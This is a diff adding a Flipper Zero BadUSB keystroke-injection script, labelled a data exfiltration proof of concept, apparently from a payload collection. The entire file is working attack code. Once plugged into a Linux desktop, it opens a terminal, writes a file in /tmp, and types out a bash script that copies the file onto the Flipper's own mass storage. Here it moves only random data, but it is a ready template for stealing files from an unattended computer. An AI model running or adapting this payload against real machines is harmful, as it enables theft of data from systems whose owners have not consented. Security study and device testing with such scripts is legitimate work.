@@ -1,0 +1,58 @@
+ID ch4r:bdsb cutreLabs:FlipperZero
+
+REM Data Exfiltration PoC
+
+REM ESC just in case
+ESC
+
+REM run a command
+ALT F2
+DELAY 500
+
+DEFAULT_STRING_DELAY 10
+
+REM try to find a terminal
+STRING sh -c "xdg-terminal-exec||kgx||ptyxis||gnome-terminal||mate-terminal||xfce4-terminal||tilix||konsole||xterm||wezterm-gui"
+DELAY 200
+ENTER
+
+REM testing on a slow machine modify this value
+DELAY 5000
+GUI LEFT
+
+REM REM Write some random data to a file
+STRINGLN cd /tmp; cat /dev/urandom|base64|head -c 25 > my_data.txt
+
+REM =================== Exfiltration PoC ===================
+
+REM Command to tell Flipper that will be exfiltration
+REM Could be place at the begining of the file (after the ID if is there)
+STORAGE
+
+REM Create a bash script to do the exfiltration
+STRINGLN cat > exfiltration.sh << EOF
+
+STRINGLN #!/bin/bash
+STRINGLN # Create a function to get the Mass Storage path
+STRINGLN gms(){ ms=\$(df|awk '/MASSSTORAGE/{print \$6}');}
+
+STRINGLN # Repeat until get the Mass Storage path 
+STRINGLN until [ \`echo \$ms 2>/dev/null\` ];do gms;done;
+
+REM Copy the generated file on the Mass Storage
+STRINGLN cp my_data.txt \$ms
+
+STRINGLN # Done :)
+STRINGLN echo done :\)
+
+STRINGLN EOF
+
+REM Execute the script
+STRINGLN sh exfiltration.sh
+
+REM =======================================================
+
+REM For demo purposes
+STRINGLN cat my_data.txt
+ENTER
+
